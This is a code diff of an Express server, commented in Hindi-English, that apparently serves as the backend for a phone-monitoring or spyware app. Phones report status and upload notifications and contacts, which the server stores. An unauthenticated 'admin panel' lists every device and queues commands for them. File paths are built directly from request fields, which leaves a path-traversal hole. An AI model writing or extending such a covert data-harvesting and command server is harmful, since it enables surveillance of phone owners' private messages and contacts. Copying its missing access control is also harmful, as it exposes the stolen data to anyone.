@@ -17,62 +17,63 @@ app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 app.use(express.static(__dirname));
 
+// Global object sabhi devices ka data aur commands store karne ke liye
 let devices = {}; 
 
 // ==================================================
-// 📲 PHONE SIDE
+// 📲 PHONE SIDE (App se data aana)
 // ==================================================
 
 app.post('/api/status', (req, res) => {
     const { device_id, model, battery, version, charging } = req.body; 
-    const id = device_id || "M2103K19I";
+    
+    // Agar app se ID nahi aayi toh process na karein
+    if (!device_id) return res.status(400).json({ error: "No Device ID" });
 
-    if (!devices[id]) devices[id] = {};
-    const pendingCommand = devices[id].command || "none";
+    // 1. Purana command dhoondo (agar koi pending hai)
+    const pendingCommand = (devices[device_id] && devices[device_id].command) ? devices[device_id].command : "none";
 
-    devices[id] = {
+    // 2. Device ka naya data update karo
+    devices[device_id] = {
+        id: device_id,
         model: model || "Unknown",
         battery: battery || 0,
         version: version || "--",
         charging: charging === 'true' || charging === true,
         lastSeen: Date.now(),
-        command: "" 
+        command: "none" // Command bhejte hi server se clear kar do
     };
 
-    console.log(`📡 Ping from ${id} | Cmd: ${pendingCommand}`);
+    console.log(`📡 Ping from ID: ${device_id} | Battery: ${battery}% | Cmd Sent: ${pendingCommand}`);
+    
+    // App ko command bhej do (Silent/Normal etc.)
     res.json({ status: "success", command: pendingCommand });
 });
 
 app.post('/api/upload_data', (req, res) => {
     const { device_id, type, data } = req.body;
-    const id = device_id || "M2103K19I";
+    if (!device_id) return res.status(400).json({ error: "No ID" });
 
-    console.log(`📥 Data Received: [${type}] from ${id}`);
+    console.log(`📥 Data Received: [${type}] from ${device_id}`);
 
     let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
-
-    const fileName = `${id}_${type}.json`;
+    const fileName = `${device_id}_${type}.json`;
     const filePath = path.join(UPLOADS_DIR, fileName);
 
     try {
-        // --- NOTIFICATION APPEND LOGIC ADDED ---
         let finalData;
-        
         if (type === 'notifications') {
             let existingData = [];
             if (fs.existsSync(filePath)) {
                 try {
                     const content = fs.readFileSync(filePath, 'utf8');
                     existingData = JSON.parse(content);
-                    if (!Array.isArray(existingData)) existingData = [existingData];
                 } catch (e) { existingData = []; }
             }
-            // Naya data list mein sabse upar jodo
+            if (!Array.isArray(existingData)) existingData = [];
             existingData.unshift(parsedData); 
-            // Max 100 notifications rakhein taaki server crash na ho
             finalData = existingData.slice(0, 100);
         } else {
-            // Contacts ya baaki cheezon ke liye purana style (Full Overwrite)
             finalData = parsedData;
         }
 
@@ -85,13 +86,30 @@ app.post('/api/upload_data', (req, res) => {
 });
 
 // ==================================================
-// 💻 DASHBOARD SIDE
+// 💻 DASHBOARD SIDE (Admin Panel)
 // ==================================================
+
+// Dashboard ko saare devices ki list dikhane ke liye
+app.get('/api/admin/all-devices', (req, res) => {
+    res.json(devices);
+});
+
+app.post('/api/send-command', (req, res) => {
+    const { device_id, command } = req.body;
+
+    if (!devices[device_id]) {
+        // Agar device abhi tak ping nahi kiya toh temporary memory banao
+        devices[device_id] = { id: device_id };
+    }
+    
+    devices[device_id].command = command;
+    console.log(`🚀 Command [${command}] queued for ID: ${device_id}`);
+    res.json({ status: "success" });
+});
 
 app.get('/api/get-data/:device_id/:type', (req, res) => {
     const { device_id, type } = req.params;
-    const fileName = `${device_id}_${type}.json`;
-    const filePath = path.join(UPLOADS_DIR, fileName);
+    const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);
 
     if (fs.existsSync(filePath)) {
         res.sendFile(filePath);
@@ -100,26 +118,6 @@ app.get('/api/get-data/:device_id/:type', (req, res) => {
     }
 });
 
-app.post('/api/send-command', (req, res) => {
-    const { device_id, command } = req.body;
-    const id = device_id || "M2103K19I"; 
-
-    if (!devices[id]) devices[id] = {};
-    devices[id].command = command;
-    
-    console.log(`🚀 Command [${command}] queued for ${id}`);
-    res.json({ status: "success" });
-});
-
-app.get('/api/device-status/:id', (req, res) => {
-    const id = req.params.id;
-    const device = devices[id];
-    if (!device) return res.json({ isOnline: false });
-
-    const isOnline = (Date.now() - device.lastSeen) < 60000;
-    res.json({ ...device, isOnline });
-});
-
 app.listen(PORT, () => {
-    console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`);
+    console.log(`🔥 CYBER-SERVER RUNNING ON PORT ${PORT}`);
 });
